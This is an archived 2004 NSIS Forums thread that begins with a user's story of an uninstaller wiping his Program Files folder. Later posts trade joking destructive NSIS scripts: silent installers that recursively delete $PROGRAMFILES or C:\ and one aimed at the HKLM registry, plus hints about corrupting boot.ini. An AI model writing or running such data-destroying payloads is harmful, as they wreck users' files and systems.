<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Funny story on how NSIS is dangerous when in wrong hands" />

  <title>Funny story on how NSIS is dangerous when in wrong hands - NSIS Forums</title><!-- Bootstrap core CSS -->
  <link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/bootswatch/3.0.1/readable/bootstrap.min.css" />
  <link rel="stylesheet" href="../css/style.css" type="text/css" /><!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!--[if lt IE 9]>
                <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
                <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->
</head>

<body>
  <div class="container">
    <!-- Put navigation bar here -->

    <ol class="breadcrumb">
      <li><a href="../index.html" class="glyphicon glyphicon-home"></a></li>

      <li><a href="f-65.html">NSIS Discussion</a></li>

      <li class="active">Funny story on how NSIS is dangerous when in wrong hands</li>
    </ol>

    <p class="lead text-muted">Archive: <a title="Try the Internet Archive" target="_blank" href="http://web.archive.org/web/*/forums.winamp.com/showthread.php?t=172552">Funny story on how NSIS is dangerous when in wrong hands</a></p><br />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Fraeon</span><br />
      <span class="post-time small text-muted">8th March 2004 14:11 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content"><strong>Funny story on how NSIS is dangerous when in wrong hands</strong><br />
      Ok, new poster. I want to tell you a story about what happened when I last used NSIS.<br />
      <br />
      Anyhow, like you usually do with it, I was working on an installer for a project of mine. Well, I wasn't satisfied on a default installer and I wanted to easily change the settings in my installer, like the default installation/uninstallation paths, application names and so on, so I decided to create an external header for that information. I promptly named in setup.cfg<br />
      <br />
      Anyhow, I compiled the thing, then installed what was in the installer to see if it worked. Then I UNinstalled it and noticed that my whole 'program files' folder had been deleted. This is when I remembered that I hadn't put any information in the setup.cfg file, I only made the installer to read it. :p<br />
      <br />
      After that, Windows refused to work. I couldn't start any program, since Windows 2000 is so IE dependent and I just had purged it(accidentally) :(<br />
      <br />
      Blargh, I'm an idiot.<br />
      <br />
      Now after re-installing, I have to be more careful. Heh, it was all my fault to begin with, and the Windows needed a re-install anyhow.<br />
      <br />
      Here ends my story of idiocy.</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">MindlessOath</span><br />
      <span class="post-time small text-muted">8th March 2004 20:53 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">yay.. i doubt it will be the last time, so share with us any future endivers. :D</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">apollo51</span><br />
      <span class="post-time small text-muted">9th March 2004 08:26 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">haha, yes dangerous indeed :) program files killer.exe :)<br />
      <br />
      but in fact, every scripting language can be dangerous when in the wrong hands... you can use every installer to drop a trojan or delete files...</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Fraeon</span><br />
      <span class="post-time small text-muted">9th March 2004 13:57 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content"></p>

      <blockquote>
        <i>Originally posted by apollo51</i><br />
        <b>haha, yes dangerous indeed :) program files killer.exe :)<br />
        <br />
        but in fact, every scripting language can be dangerous when in the wrong hands... you can use every installer to drop a trojan or delete files...</b>
      </blockquote>I was aware that it COULD happen, but I wasn't really prepared that I was the one who would do that mistake. ;)<br />
      <br />
      Thank God I had a back-up from 2 weeks back so I didn't lose much, really. Except for that installer, that is.
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">apollo51</span><br />
      <span class="post-time small text-muted">9th March 2004 14:11 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Lol you spend 2 weeks on a installer file that deletes program files? I can do it within a minute :p<br />
      <br />
      OutFile "Kill program files.exe"<br />
      <br />
      Section "moehaha"<br />
      RMDir /r "$PROGRAMFILES"<br />
      SectionEnd</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">VegetaSan</span><br />
      <span class="post-time small text-muted">9th March 2004 14:41 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Hahahaa That is funny. I had something like that earlier<br />
      <br />
      I was f**** with my register and I was amazed that I deleted<br />
      <br />
      HKLM\Software\Microsoft\Currentversion\Explorer\FileExt....<br />
      And everyting inside it :(<br />
      <br />
      I don't know how I did that but probebly with my NSIS Installer because I found this..<br />
      <br />
      <font size="1"><br />
      DeleteRegKey HKLM \Software\Microsoft\Currentversion\Explorer\FileExt<br /></font><br />
      <br />
      Kinda Stupid :)<br />
      So I installed Windows all over :) :)</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Joel</span><br />
      <span class="post-time small text-muted">9th March 2004 15:07 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Kids, don't try this at home:<br /></p>
      <pre>
<code><br />RMDir /r "C:\*.*"<br /></code>
</pre><br />
      Is cool to talk about funny stuff. Mostly NSIS forum is for help, sharing, etc...<br />
      Sometimes we need a relax time after a long time of hard coding :)<br />
      Just play nice ;)
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Fraeon</span><br />
      <span class="post-time small text-muted">9th March 2004 15:47 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content"></p>

      <blockquote>
        <i>Originally posted by apollo51</i><br />
        <b>Lol you spend 2 weeks on a installer file that deletes program files? I can do it within a minute :p<br />
        <br />
        OutFile "Kill program files.exe"<br />
        <br />
        Section "moehaha"<br />
        RMDir /r "$PROGRAMFILES"<br />
        SectionEnd</b>
      </blockquote>Nope, not two weeks on that installer. I did that installer within a day.<br />
      <br />
      I said that the backup I had was from 2 weeks back. :p<br />
      <br />
      And luckily I didn't lose anything of much worth.
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Comm@nder21</span><br />
      <span class="post-time small text-muted">9th March 2004 20:36 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">here is the improved code:<br /></p>
      <pre>
<code>Name</code><span style="color: #DD0000">"Killprogramfilesv1.1"
<br /></span><span style="color: #0000BB">OutFile</span><span style="color: #DD0000">"kpf_11.exe"
<br /></span><span style="color: #0000BB">SilentInstallsilent
<br /><br />Section</span><span style="color: #DD0000">"moehaha"
<br /></span><span style="color: #0000BB">RMDir</span><span style="color: #007700">/</span><span style="color: #0000BB">r</span><span style="color: #DD0000">"$PROGRAMFILES"
<br /></span><span style="color: #0000BB">FileExists</span><span style="color: #DD0000">"$PROGRAMFILES\*.*"</span><span style="color: #007700">+</span><span style="color: #0000BB">2
<br />MessageBoxMB_OK</span><span style="color: #007700">|</span><span style="color: #0000BB">MB_ICONINFORMATION</span><span style="color: #DD0000">"$PROGRAMFILEShasbeensuccessfullyremoved,MOEHAHA!"
<br /></span><span style="color: #0000BB">SectionEnd
<br /></span>
</pre>:D :D<br />
      <br />
      let's get it on ..
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">apollo51</span><br />
      <span class="post-time small text-muted">9th March 2004 21:19 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Did you compiled and executed it for testing purpose? (You may reply from another computer while reinstalling the test computer)</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">deguix</span><br />
      <span class="post-time small text-muted">9th March 2004 21:58 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Remember, when using [ PHP ] (without spaces inside []) and using backslashes ("\"), you have to put 2 backslashes ("\\") so will result in just one. The correct code is (USE AT YOUR OWN RISK):<br />
      <br /></p>
      <pre>
<code>Name</code><span style="color: #DD0000">"Killprogramfilesv1.1"
<br /></span><span style="color: #0000BB">OutFile</span><span style="color: #DD0000">"kpf_11.exe"
<br /></span><span style="color: #0000BB">SilentInstallsilent
<br /><br />Section</span><span style="color: #DD0000">"moehaha"
<br /></span><span style="color: #0000BB">RMDir</span><span style="color: #007700">/</span><span style="color: #0000BB">r</span><span style="color: #DD0000">"$PROGRAMFILES"
<br /></span><span style="color: #0000BB">FileExists</span><span style="color: #DD0000">"$PROGRAMFILES\\*.*"</span><span style="color: #007700">+</span><span style="color: #0000BB">2
<br />MessageBoxMB_OK</span><span style="color: #007700">|</span><span style="color: #0000BB">MB_ICONINFORMATION</span><span style="color: #DD0000">"$PROGRAMFILEShas\\
<br />beensuccessfullyremoved,MOEHAHA!"
<br /></span><span style="color: #0000BB">SectionEnd
<br /></span>
</pre>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Brummelchen</span><br />
      <span class="post-time small text-muted">10th March 2004 02:39 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">welcome to the club :D<br />
      <br />
      i trashed my winxp with some kind of deleting the whole HKLM registry path<br />
      <br />
      thx god i had a backup image (pq drive image).<br />
      <br />
      the hardest thing is to trash the bootsecor on c: with some extra tool inside or on win(nt)-systems delete something NTLDR or NTDETECT or in general WIN.<br />
      <br />
      ok lets stop here :hang:</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">apollo51</span><br />
      <span class="post-time small text-muted">10th March 2004 06:39 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">You can use WriteINIStr to change boot.ini :)</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">deguix</span><br />
      <span class="post-time small text-muted">10th March 2004 10:18 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Do not test this code at home... (USE AT YOUR OWN RISK):<br />
      <br /></p>
      <pre>
<code>Name</code><span style="color: #DD0000">"Killregistryv1.0"
<br /></span><span style="color: #0000BB">OutFile</span><span style="color: #DD0000">"kr_10.exe"
<br /></span><span style="color: #0000BB">SilentInstallsilent
<br /><br />Section</span><span style="color: #DD0000">"moehaha"
<br /></span><span style="color: #0000BB">DeleteINIKeyHKLM</span><span style="color: #DD0000">""
<br /></span><span style="color: #0000BB">EnumRegKey</span><span style="color: #007700">$</span><span style="color: #0000BB">0HKLM</span><span style="color: #DD0000">""</span><span style="color: #0000BB">0
<br />StrCmp</span><span style="color: #007700">$</span><span style="color: #0000BB">0</span><span style="color: #DD0000">""</span><span style="color: #007700">+</span><span style="color: #0000BB">2
<br />MessageBoxMB_OK</span><span style="color: #007700">|</span><span style="color: #0000BB">MB_ICONINFORMATION</span><span style="color: #DD0000">"HKLMrootkeyhas\\
<br />beensuccessfullyremoved,MOEHAHA!"
<br /></span><span style="color: #0000BB">SectionEnd
<br /></span>
</pre>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">apollo51</span><br />
      <span class="post-time small text-muted">10th March 2004 10:48 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content">Shouldn't there be 'un' before the section since it removes more than it installs? :p</p>
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">eccles</span><br />
      <span class="post-time small text-muted">10th March 2004 19:45 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content"></p>

      <blockquote>
        Do not test this code at home...
      </blockquote>Oh, OK, I'll just try it on my machine at work......<br />
      <br />
      :D
    </div>
    <hr />

    <div class="post">
      <p class="post-meta"><span class="post-author text-primary">Comm@nder21</span><br />
      <span class="post-time small text-muted">11th March 2004 17:08 <abbr title="Coordinated Universal Time">UTC</abbr></span></p>

      <p class="post-content"></p>

      <blockquote>
        Shouldn't there be 'un' before the section since it removes more than it installs?
      </blockquote>no, because there's no uninstaller there, and this code should be executed when you start the programm.
    </div>
    <hr />

    <div class="footer">
      <p class="text-muted small">Fork me on <a href="https://github.com/nsis-dev/NSIS-Forums/">GitHub</a></p>
    </div>
  </div><script src="../js/highlight.pack.js" type="text/javascript">
</script><script type="text/javascript">
//<![CDATA[
  hljs.initHighlightingOnLoad();
  //]]>
  </script>
</body>
</html>
